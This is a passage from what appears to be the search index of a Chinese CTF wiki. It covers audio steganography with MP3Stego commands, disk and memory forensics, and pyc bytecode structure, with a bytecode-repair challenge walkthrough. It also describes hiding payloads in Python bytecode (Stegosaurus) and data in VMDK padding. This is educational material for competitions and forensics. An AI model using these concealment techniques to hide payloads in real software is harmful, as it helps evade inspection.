\nslienteye\n \u5373\u53ef\u3002\n\n\n\n\n\u5ef6\u4f38\n\n\n\n\n\u97f3\u9891\u4e2d\u7684 LSB\n\n\n\u9690\u5199\u672f\u603b\u7ed3", 
            "title": "\u97f3\u9891\u9690\u5199"
        }, 
        {
            "location": "/misc/audio/introduction/#_1", 
            "text": "\u901a\u8fc7  binwalk  \u4ee5\u53ca  strings  \u53ef\u4ee5\u53d1\u73b0\u7684\u4fe1\u606f\u4e0d\u518d\u8be6\u8ff0\u3002", 
            "title": "\u5e38\u89c1\u624b\u6bb5"
        }, 
        {
            "location": "/misc/audio/introduction/#mp3", 
            "text": "", 
            "title": "MP3 \u9690\u5199"
        }, 
        {
            "location": "/misc/audio/introduction/#_2", 
            "text": "MP3\u9690\u5199\u4e3b\u8981\u662f\u4f7f\u7528  Mp3Stego  \u5de5\u5177\u8fdb\u884c\u9690\u5199\uff0c\u5176\u57fa\u672c\u4ecb\u7ecd\u53ca\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b   MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream.   encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3\ndecode -X -P pass svega_stego.mp3", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/audio/introduction/#_3", 
            "text": "ISCC-2016: Music Never Sleep   \u521d\u6b65\u89c2\u5bdf\u540e\uff0c\u7531  strings  \u65e0\u53d1\u73b0\uff0c\u542c\u97f3\u9891\u65e0\u5f02\u5e38\u731c\u6d4b\u4f7f\u7528\u9690\u5199\u8f6f\u4ef6\u9690\u85cf\u6570\u636e\u3002   \u5f97\u5230\u5bc6\u7801\u540e\u4f7f\u7528  Mp3Stego  \u89e3\u5bc6\u3002  decode.exe -X ISCC2016.mp3 -P bfsiscc2016  \u5f97\u5230\u6587\u4ef6  iscc2016.mp3.txt : Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???  Base64   Base32 \u540e\u5f97\u5230 flag\u3002", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/audio/introduction/#_4", 
            "text": "", 
            "title": "\u6ce2\u5f62"
        }, 
        {
            "location": "/misc/audio/introduction/#_5", 
            "text": "\u901a\u5e38\u6765\u8bf4\uff0c\u6ce2\u5f62\u65b9\u5411\u7684\u9898\uff0c\u5728\u89c2\u5bdf\u5230\u5f02\u5e38\u540e\uff0c\u4f7f\u7528\u76f8\u5173\u8f6f\u4ef6\uff08Audacity, Adobe Audition \u7b49\uff09\u89c2\u5bdf\u6ce2\u5f62\u89c4\u5f8b\uff0c\u5c06\u6ce2\u5f62\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a 01 \u5b57\u7b26\u4e32\u7b49\uff0c\u4ece\u800c\u63d0\u53d6\u8f6c\u5316\u51fa\u6700\u7ec8\u7684 flag\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/audio/introduction/#_6", 
            "text": "ISCC-2017: Misc-04   \u5176\u5b9e\u8fd9\u9898\u9690\u85cf\u7684\u4fe1\u606f\u5728\u6700\u5f00\u59cb\u7684\u4e00\u6bb5\u97f3\u9891\u5185\uff0c\u4e0d\u7ec6\u5fc3\u542c\u53ef\u80fd\u4f1a\u8bef\u8ba4\u4e3a\u662f\u9690\u5199\u8f6f\u4ef6\u3002   \u4ee5\u9ad8\u4e3a 1 \u4f4e\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230  01  \u5b57\u7b26\u4e32\u3002  110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101  \u8f6c\u4e3a ASCII\uff0c\u6469\u65af\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 flag\u3002   Note  \u4e00\u4e9b\u8f83\u590d\u6742\u7684\u53ef\u80fd\u4f1a\u5148\u5bf9\u97f3\u9891\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u5904\u7406\uff0c\u5982\u6ee4\u6ce2\u7b49\u3002\u4f8b\u5982  JarvisOJ - \u4e0a\u5e1d\u4e4b\u97f3 Writeup", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/audio/introduction/#_7", 
            "text": "", 
            "title": "\u9891\u8c31"
        }, 
        {
            "location": "/misc/audio/introduction/#_8", 
            "text": "\u97f3\u9891\u4e2d\u7684\u9891\u8c31\u9690\u5199\u662f\u5c06\u5b57\u7b26\u4e32\u9690\u85cf\u5728\u9891\u8c31\u4e2d\uff0c\u6b64\u7c7b\u97f3\u9891\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u7279\u5f81\uff0c\u542c\u8d77\u6765\u662f\u4e00\u6bb5\u6742\u97f3\u6216\u8005\u6bd4\u8f83\u523a\u8033\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/audio/introduction/#_9", 
            "text": "Su-ctf-quals-2014:hear_with_your_eyes", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/audio/introduction/#lsb", 
            "text": "", 
            "title": "LSB\u97f3\u9891\u9690\u5199"
        }, 
        {
            "location": "/misc/audio/introduction/#_10", 
            "text": "\u7c7b\u4f3c\u4e8e\u56fe\u7247\u9690\u5199\u4e2d\u7684 LSB \u9690\u5199\uff0c\u97f3\u9891\u4e2d\u4e5f\u6709\u5bf9\u5e94\u7684 LSB \u9690\u5199\u3002\u4e3b\u8981\u53ef\u4ee5\u4f7f\u7528  Silenteye  \u5de5\u5177\uff0c\u5176\u4ecb\u7ecd\u5982\u4e0b\uff1a   SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/audio/introduction/#_11", 
            "text": "2015 \u5e7f\u4e1c\u7701\u5f3a\u7f51\u676f - Little Apple   \u76f4\u63a5\u4f7f\u7528  slienteye  \u5373\u53ef\u3002", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/audio/introduction/#_12", 
            "text": "\u97f3\u9891\u4e2d\u7684 LSB  \u9690\u5199\u672f\u603b\u7ed3", 
            "title": "\u5ef6\u4f38"
        }, 
        {
            "location": "/misc/disk-memory/introduction/", 
            "text": "\u5e38\u7528\u5de5\u5177\n\n\n\n\nEasyRecovery\n\n\nMedAnalyze\n\n\nFTK\n\n\nElcomsoft Forensic Disk Decryptor\n\n\nVolatility\n\n\n\n\n\u78c1\u76d8\n\n\n\u5e38\u89c1\u7684\u78c1\u76d8\u5206\u533a\u683c\u5f0f\u6709\u4ee5\u4e0b\u51e0\u79cd\n\n\n\n\nWindows: FAT12 -\n FAT16 -\n FAT32 -\n NTFS\n\n\nLinux: EXT2 -\n EXT3 -\n EXT4\n\n\n\n\nFAT \u4e3b\u78c1\u76d8\u7ed3\u6784\n\n\n\n\n\n\n\n\n\u5220\u9664\u6587\u4ef6\uff1a\u76ee\u5f55\u8868\u4e2d\u6587\u4ef6\u540d\u7b2c\u4e00\u5b57\u8282 \ne5\n\u3002\n\n\n\n\n\n\nVMDK\n\n\nVMDK \u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u7269\u7406\u786c\u76d8\u7684\u865a\u62df\u7248\uff0c\u4e5f\u4f1a\u5b58\u5728\u8ddf\u7269\u7406\u786c\u76d8\u7684\u5206\u533a\u548c\u6247\u533a\u4e2d\u7c7b\u4f3c\u7684\u586b\u5145\u533a\u57df\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u586b\u5145\u533a\u57df\u6765\u628a\u6211\u4eec\u9700\u8981\u9690\u85cf\u7684\u6570\u636e\u9690\u85cf\u5230\u91cc\u9762\u53bb\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9690\u85cf\u7684\u6587\u4ef6\u589e\u52a0\u4e86 VMDK \u6587\u4ef6\u7684\u5927\u5c0f\uff08\u5982\u76f4\u63a5\u9644\u52a0\u5230\u6587\u4ef6\u540e\u7aef\uff09\uff0c\u4e5f\u53ef\u4ee5\u907f\u514d\u7531\u4e8e VMDK \u6587\u4ef6\u5927\u5c0f\u7684\u6539\u53d8\u6240\u5e26\u6765\u7684\u53ef\u80fd\u5bfc\u81f4\u7684\u865a\u62df\u673a\u9519\u8bef\u3002\u800c\u4e14 VMDK \u6587\u4ef6\u4e00\u822c\u6bd4\u8f83\u5927\uff0c\u9002\u5408\u7528\u4e8e\u9690\u85cf\u5927\u6587\u4ef6\u3002\n\n\n\u5185\u5b58\n\n\n\n\n\u89e3\u6790 Windows / Linux / Mac OS X \u5185\u5b58\u7ed3\u6784\n\n\n\u5206\u6790\u8fdb\u7a0b\uff0c\u5185\u5b58\u6570\u636e\n\n\n\u6839\u636e\u9898\u76ee\u63d0\u793a\u5bfb\u627e\u7ebf\u7d22\u548c\u601d\u8def\uff0c\u63d0\u53d6\u5206\u6790\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u5185\u5b58\u6570\u636e\n\n\n\n\n\u9898\u76ee\n\n\n\n\nJarvis OJ - MISC - \u53d6\u8bc1 2\n\n\n\n\n\u53c2\u8003\n\n\n\n\n\u6570\u636e\u9690\u85cf\u6280\u672f", 
            "title": "\u78c1\u76d8\u5185\u5b58\u5206\u6790"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#_1", 
            "text": "EasyRecovery  MedAnalyze  FTK  Elcomsoft Forensic Disk Decryptor  Volatility", 
            "title": "\u5e38\u7528\u5de5\u5177"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#_2", 
            "text": "\u5e38\u89c1\u7684\u78c1\u76d8\u5206\u533a\u683c\u5f0f\u6709\u4ee5\u4e0b\u51e0\u79cd   Windows: FAT12 -  FAT16 -  FAT32 -  NTFS  Linux: EXT2 -  EXT3 -  EXT4   FAT \u4e3b\u78c1\u76d8\u7ed3\u6784     \u5220\u9664\u6587\u4ef6\uff1a\u76ee\u5f55\u8868\u4e2d\u6587\u4ef6\u540d\u7b2c\u4e00\u5b57\u8282  e5 \u3002", 
            "title": "\u78c1\u76d8"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#vmdk", 
            "text": "VMDK \u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u7269\u7406\u786c\u76d8\u7684\u865a\u62df\u7248\uff0c\u4e5f\u4f1a\u5b58\u5728\u8ddf\u7269\u7406\u786c\u76d8\u7684\u5206\u533a\u548c\u6247\u533a\u4e2d\u7c7b\u4f3c\u7684\u586b\u5145\u533a\u57df\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u586b\u5145\u533a\u57df\u6765\u628a\u6211\u4eec\u9700\u8981\u9690\u85cf\u7684\u6570\u636e\u9690\u85cf\u5230\u91cc\u9762\u53bb\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9690\u85cf\u7684\u6587\u4ef6\u589e\u52a0\u4e86 VMDK \u6587\u4ef6\u7684\u5927\u5c0f\uff08\u5982\u76f4\u63a5\u9644\u52a0\u5230\u6587\u4ef6\u540e\u7aef\uff09\uff0c\u4e5f\u53ef\u4ee5\u907f\u514d\u7531\u4e8e VMDK \u6587\u4ef6\u5927\u5c0f\u7684\u6539\u53d8\u6240\u5e26\u6765\u7684\u53ef\u80fd\u5bfc\u81f4\u7684\u865a\u62df\u673a\u9519\u8bef\u3002\u800c\u4e14 VMDK \u6587\u4ef6\u4e00\u822c\u6bd4\u8f83\u5927\uff0c\u9002\u5408\u7528\u4e8e\u9690\u85cf\u5927\u6587\u4ef6\u3002", 
            "title": "VMDK"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#_3", 
            "text": "\u89e3\u6790 Windows / Linux / Mac OS X \u5185\u5b58\u7ed3\u6784  \u5206\u6790\u8fdb\u7a0b\uff0c\u5185\u5b58\u6570\u636e  \u6839\u636e\u9898\u76ee\u63d0\u793a\u5bfb\u627e\u7ebf\u7d22\u548c\u601d\u8def\uff0c\u63d0\u53d6\u5206\u6790\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u5185\u5b58\u6570\u636e", 
            "title": "\u5185\u5b58"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#_4", 
            "text": "Jarvis OJ - MISC - \u53d6\u8bc1 2", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/disk-memory/introduction/#_5", 
            "text": "\u6570\u636e\u9690\u85cf\u6280\u672f", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/misc/other/pyc/", 
            "text": "code object\n\n\n\n\n\u5728\u6211\u4eec\u5bfc\u5165 python \u811a\u672c\u65f6\u5728\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e2a\u4e00\u4e2a\u76f8\u5e94\u7684 pyc \u6587\u4ef6\uff0c\u662fpythoncodeobj\u7684\u6301\u4e45\u5316\u50a8\u5b58\u5f62\u5f0f,\u52a0\u901f\u4e0b\u4e00\u6b21\u7684\u88c5\u8f7d\u3002\n\n\n\n\n\u6587\u4ef6\u7ed3\u6784\n\n\npyc\u6587\u4ef6\u7531\u4e09\u5927\u90e8\u5206\u7ec4\u6210\n\n\n\n\n\n\n\u6700\u5f00\u59cb4\u4e2a\u5b57\u8282\u662f\u4e00\u4e2aMaigc int, \u6807\u8bc6\u6b64pyc\u7684\u7248\u672c\u4fe1\u606f\n\n\n\n\n\n\n\u63a5\u4e0b\u6765\u56db\u4e2a\u5b57\u8282\u8fd8\u662f\u4e2aint,\u662fpyc\u4ea7\u751f\u7684\u65f6\u95f4\n\n\n\n\n\n\n\u5e8f\u5217\u5316\u7684 PyCodeObject,\u7ed3\u6784\u53c2\u7167\ninclude/code.h\n,\u5e8f\u5217\u5316\u65b9\u6cd5\npython/marshal\n\n\n\n\n\n\npyc\u5b8c\u6574\u7684\u6587\u4ef6\u89e3\u6790\u53ef\u4ee5\u53c2\u7167\n\n\n\n\nPython\u7a0b\u5e8f\u7684\u6267\u884c\u539f\u7406\n\n\nPYC\u6587\u4ef6\u683c\u5f0f\u5206\u6790\n\n\n\n\n\u5173\u4e8eco_code\n\n\n\u4e00\u4e32\u4e8c\u8fdb\u5236\u6d41,\u4ee3\u8868\u7740\u6307\u4ee4\u5e8f\u5217,\u5177\u4f53\u5b9a\u4e49\u5728\ninclude/opcode.h\n\u4e2d,\u4e5f\u53ef\u4ee5\u53c2\u7167\npython opcodes\n\u3002\n\n\n\u7531\n\n\n\n\n\n\n\u6307\u4ee4(opcode),\u5206\u4e3a\u6709\u53c2\u6570\u548c\u65e0\u53c2\u6570\u4e24\u79cd,\u4ee5 \nhttps://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69\n \u5212\u5206\n\n\n\n\n\n\n\u53c2\u6570(oparg)\n\n\n\n\n\n\npython3.6 \u4ee5\u4e0a\u53c2\u6570\u6c38\u8fdc\u53601\u5b57\u8282,\u5982\u679c\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5219\u4ee5\n0x00\n\u4ee3\u66ff,\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u89e3\u91ca\u5668\u5ffd\u7565,\u4e5f\u662f\nStegosaurus\n\u6280\u672f\u539f\u7406;\u800c\u4f4e\u4e8epython3.5\u7684\u7248\u672c\u4e2d\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5374\u6ca1\u6709\n0x00\n\u586b\u5145\n\n\n\u4f8b\u9898\n\n\nHackover CTF 2016 : img-enc\n\n\n\u9996\u5148\u5c1d\u8bd5pycdc\u53cd\u7f16\u8bd1\u5931\u8d25\n\n\n# Source Generated with Decompyle++\n\n\n# File: imgenc.pyc (Python 2.7)\n\n\n\nimport\n \nsys\n\n\nimport\n \nnumpy\n \nas\n \nnp\n\n\nfrom\n \nscipy.misc\n \nimport\n \nimread\n,\n \nimsave\n\n\n\ndef\n \ndoit\n(\ninput_file\n,\n \noutput_file\n,\n \nf\n):\n\n\nUnsupported\n \nopcode\n:\n \nSTOP_CODE\n\n    \nimg\n \n=\n \nimread\n(\ninput_file\n,\n \nflatten\n \n=\n \nTrue\n)\n\n    \nimg\n \n/=\n \n255\n\n    \nsize\n \n=\n \nimg\n.\nshape\n[\n0\n]\n\n\n# WARNING: Decompyle incomplete\n\n\n\n\n\n\u6ce8\u610f\u5230\u662fpython2.7,\u4e5f\u5c31\u662f\u8bf4\u6307\u4ee4\u5e8f\u5217\u5171\u53601\u5b57\u8282\u62163\u5b57\u8282(\u6709\u53c2\u6570\u65e0\u53c2\u6570)\n\n\n\u4f7f\u7528pcads\u5f97\u5230\n\n\nimgenc.pyc (Python 2.7)\n...\n                67      STOP_CODE               \n                68      STOP_CODE               \n                69      BINARY_DIVIDE           \n                70      JUMP_IF_TRUE_OR_POP     5\n                73      LOAD_CONST              3: 0\n                76      LOAD_CONST              3: 0\n                79      BINARY_DIVIDE       \n\n\n\n\n\u5b9a\u4f4d\u5230\u51fa\u9519\u7684\u5730\u65b9,\u89c2\u5bdf\u53d1\u73b0 \nLOAD_CONST LOAD_CONST BINARY_DIVIDE STORE_FAST opcodes (64 03 00 64 03 00 15 7d 05 00)\n\u88ab\u7834\u574f\u4e86,\u6839\u636e\u4e0a\u4e0b\u6587\u7ebf\u7d22\u4fee\u590d\u540e\n\n\n00000120  64 04 00 6b 00 00 72 ce  00 64 03 00 64 03 00 15  |d..k..r..d..d...|\n00000130  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000140  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n00000150  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n00000160  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 64  |..}..d..d...}..d|\n00000170  03 00 64 03 00 15 7d 05  00 64 03 00 64 03 00 15  |..d...}..d..d...|\n00000180  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000190  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n000001a0  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n000001b0  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 6e  |..}..d..d...}..n|\n\n\n\n\n\u63a5\u4e0b\u6765\u6839\u636e\u4fee\u590d\u597d\u7684python\u6e90\u4ee3\u7801\u5f97\u5230flag\u5373\u53ef\n\n\n\u5ef6\u4f38\n:\n\n\n\n\n\u9898\u76ee: \n0ctf-2017:py\n\n\nwriteup: \n\u8bb0\u4e00\u6b21\u624b\u64b8CPython bytecode\n\n\n\n\nTools\n\n\npycdc\n\n\n\n\n\u5c06python\u5b57\u8282\u7801\u8f6c\u6362\u4e3a\u53ef\u8bfb\u7684python \u6e90\u4ee3\u7801,\u5305\u542b\u4e86\u53cd\u6c47\u7f16(pycads)\u548c\u53cd\u7f16\u8bd1(pycdc)\u4e24\u79cd\u5de5\u5177\n\n\n\n\nStegosaurus\n\n\n\n\n\u5141\u8bb8\u6211\u4eec\u5728Python\u5b57\u8282\u7801\u6587\u4ef6\uff08pyc\u6216pyo\uff09\u4e2d\u5d4c\u5165\u4efb\u610fPayload\u3002\u7531\u4e8e\u7f16\u7801\u5bc6\u5ea6\u8f83\u4f4e\uff0c\u56e0\u6b64\u6211\u4eec\u5d4c\u5165Payload\u7684\u8fc7\u7a0b\u65e2\u4e0d\u4f1a\u6539\u53d8\u6e90\u4ee3\u7801\u7684\u8fd0\u884c\u884c\u4e3a\uff0c\u4e5f\u4e0d\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u5927\u5c0f\n\n\n\n\n\u539f\u7406\u662f\u5728python\u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e2d,\u5229\u7528\u5197\u4f59\u7a7a\u95f4,\u5c06\u5b8c\u6574\u7684payload\u4ee3\u7801\u5206\u6563\u9690\u85cf\u5230\u8fd9\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7a7a\u95f4\u4e2d.\n\n\nRef\n: \n\u4e00\u79cd\u7528\u4e8e\u5728Python\u5b57\u8282\u7801\u4e2d\u5d4c\u5165Payload\u7684\u9690\u5199\u5de5\u5177 \u2013 Stegosaurus\n\n\nChallenges\n: \nWHCTF-2017:Py-Py-Py", 
            "title": "pyc\u6587\u4ef6"
        }, 
        {
            "location": "/misc/other/pyc/#code-object", 
            "text": "\u5728\u6211\u4eec\u5bfc\u5165 python \u811a\u672c\u65f6\u5728\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e2a\u4e00\u4e2a\u76f8\u5e94\u7684 pyc \u6587\u4ef6\uff0c\u662fpythoncodeobj\u7684\u6301\u4e45\u5316\u50a8\u5b58\u5f62\u5f0f,\u52a0\u901f\u4e0b\u4e00\u6b21\u7684\u88c5\u8f7d\u3002", 
            "title": "code object"
        }, 
        {
            "location": "/misc/other/pyc/#_1", 
            "text": "pyc\u6587\u4ef6\u7531\u4e09\u5927\u90e8\u5206\u7ec4\u6210    \u6700\u5f00\u59cb4\u4e2a\u5b57\u8282\u662f\u4e00\u4e2aMaigc int, \u6807\u8bc6\u6b64pyc\u7684\u7248\u672c\u4fe1\u606f    \u63a5\u4e0b\u6765\u56db\u4e2a\u5b57\u8282\u8fd8\u662f\u4e2aint,\u662fpyc\u4ea7\u751f\u7684\u65f6\u95f4    \u5e8f\u5217\u5316\u7684 PyCodeObject,\u7ed3\u6784\u53c2\u7167 include/code.h ,\u5e8f\u5217\u5316\u65b9\u6cd5 python/marshal    pyc\u5b8c\u6574\u7684\u6587\u4ef6\u89e3\u6790\u53ef\u4ee5\u53c2\u7167   Python\u7a0b\u5e8f\u7684\u6267\u884c\u539f\u7406  PYC\u6587\u4ef6\u683c\u5f0f\u5206\u6790   \u5173\u4e8eco_code  \u4e00\u4e32\u4e8c\u8fdb\u5236\u6d41,\u4ee3\u8868\u7740\u6307\u4ee4\u5e8f\u5217,\u5177\u4f53\u5b9a\u4e49\u5728 include/opcode.h \u4e2d,\u4e5f\u53ef\u4ee5\u53c2\u7167 python opcodes \u3002  \u7531    \u6307\u4ee4(opcode),\u5206\u4e3a\u6709\u53c2\u6570\u548c\u65e0\u53c2\u6570\u4e24\u79cd,\u4ee5  https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69  \u5212\u5206    \u53c2\u6570(oparg)    python3.6 \u4ee5\u4e0a\u53c2\u6570\u6c38\u8fdc\u53601\u5b57\u8282,\u5982\u679c\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5219\u4ee5 0x00 \u4ee3\u66ff,\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u89e3\u91ca\u5668\u5ffd\u7565,\u4e5f\u662f Stegosaurus \u6280\u672f\u539f\u7406;\u800c\u4f4e\u4e8epython3.5\u7684\u7248\u672c\u4e2d\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5374\u6ca1\u6709 0x00 \u586b\u5145", 
            "title": "\u6587\u4ef6\u7ed3\u6784"
        }, 
        {
            "location": "/misc/other/pyc/#_2", 
            "text": "Hackover CTF 2016 : img-enc  \u9996\u5148\u5c1d\u8bd5pycdc\u53cd\u7f16\u8bd1\u5931\u8d25  # Source Generated with Decompyle++  # File: imgenc.pyc (Python 2.7)  import   sys  import   numpy   as   np  from   scipy.misc   import   imread ,   imsave  def   doit ( input_file ,   output_file ,   f ):  Unsupported   opcode :   STOP_CODE \n     img   =   imread ( input_file ,   flatten   =   True ) \n     img   /=   255 \n     size   =   img . shape [ 0 ]  # WARNING: Decompyle incomplete   \u6ce8\u610f\u5230\u662fpython2.7,\u4e5f\u5c31\u662f\u8bf4\u6307\u4ee4\u5e8f\u5217\u5171\u53601\u5b57\u8282\u62163\u5b57\u8282(\u6709\u53c2\u6570\u65e0\u53c2\u6570)  \u4f7f\u7528pcads\u5f97\u5230  imgenc.pyc (Python 2.7)\n...\n                67      STOP_CODE               \n                68      STOP_CODE               \n                69      BINARY_DIVIDE           \n                70      JUMP_IF_TRUE_OR_POP     5\n                73      LOAD_CONST              3: 0\n                76      LOAD_CONST              3: 0\n                79      BINARY_DIVIDE         \u5b9a\u4f4d\u5230\u51fa\u9519\u7684\u5730\u65b9,\u89c2\u5bdf\u53d1\u73b0  LOAD_CONST LOAD_CONST BINARY_DIVIDE STORE_FAST opcodes (64 03 00 64 03 00 15 7d 05 00) \u88ab\u7834\u574f\u4e86,\u6839\u636e\u4e0a\u4e0b\u6587\u7ebf\u7d22\u4fee\u590d\u540e  00000120  64 04 00 6b 00 00 72 ce  00 64 03 00 64 03 00 15  |d..k..r..d..d...|\n00000130  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000140  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n00000150  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n00000160  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 64  |..}..d..d...}..d|\n00000170  03 00 64 03 00 15 7d 05  00 64 03 00 64 03 00 15  |..d...}..d..d...|\n00000180  7d 05 00 64 03 00 64 03  00 15 7d 05 00 64 03 00  |}..d..d...}..d..|\n00000190  64 03 00 15 7d 05 00 64  03 00 64 03 00 15 7d 05  |d...}..d..d...}.|\n000001a0  00 64 03 00 64 03 00 15  7d 05 00 64 03 00 64 03  |.d..d...}..d..d.|\n000001b0  00 15 7d 05 00 64 03 00  64 03 00 15 7d 05 00 6e  |..}..d..d...}..n|  \u63a5\u4e0b\u6765\u6839\u636e\u4fee\u590d\u597d\u7684python\u6e90\u4ee3\u7801\u5f97\u5230flag\u5373\u53ef  \u5ef6\u4f38 :   \u9898\u76ee:  0ctf-2017:py  writeup:  \u8bb0\u4e00\u6b21\u624b\u64b8CPython bytecode", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/other/pyc/#tools", 
            "text": "", 
            "title": "Tools"
        }, 
        {
            "location": "/misc/other/pyc/#pycdc", 
            "text": "\u5c06python\u5b57\u8282\u7801\u8f6c\u6362\u4e3a\u53ef\u8bfb\u7684python \u6e90\u4ee3\u7801,\u5305\u542b\u4e86\u53cd\u6c47\u7f16(pycads)\u548c\u53cd\u7f16\u8bd1(pycdc)\u4e24\u79cd\u5de5\u5177", 
            "title": "pycdc"
        }, 
        {
            "location": "/misc/other/pyc/#stegosaurus", 
            "text": "\u5141\u8bb8\u6211\u4eec\u5728Python\u5b57\u8282\u7801\u6587\u4ef6\uff08pyc\u6216pyo\uff09\u4e2d\u5d4c\u5165\u4efb\u610fPayload\u3002\u7531\u4e8e\u7f16\u7801\u5bc6\u5ea6\u8f83\u4f4e\uff0c\u56e0\u6b64\u6211\u4eec\u5d4c\u5165Payload\u7684\u8fc7\u7a0b\u65e2\u4e0d\u4f1a\u6539\u53d8\u6e90\u4ee3\u7801\u7684\u8fd0\u884c\u884c\u4e3a\uff0c\u4e5f\u4e0d\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u5927\u5c0f   \u539f\u7406\u662f\u5728python\u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e2d,\u5229\u7528\u5197\u4f59\u7a7a\u95f4,\u5c06\u5b8c\u6574\u7684payload\u4ee3\u7801\u5206\u6563\u9690\u85cf\u5230\u8fd9\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7a7a\u95f4\u4e2d.  Ref :  \u4e00\u79cd\u7528\u4e8e\u5728Python\u5b57\u8282\u7801\u4e2d\u5d4c\u5165Payload\u7684\u9690\u5199\u5de5\u5177 \u2013 Stegosaurus  Challenges :  WHCTF-2017:Py-Py-Py", 
            "title": "Stegosaurus"
        }, 
        {
            "location": "/crypto/introduction/", 
            "text": "\u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002\n\n\n\u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a\n\n\n\n\n\u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09\n\n\n\u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09\n\n\n\u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f\n\n\n\n\n\u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 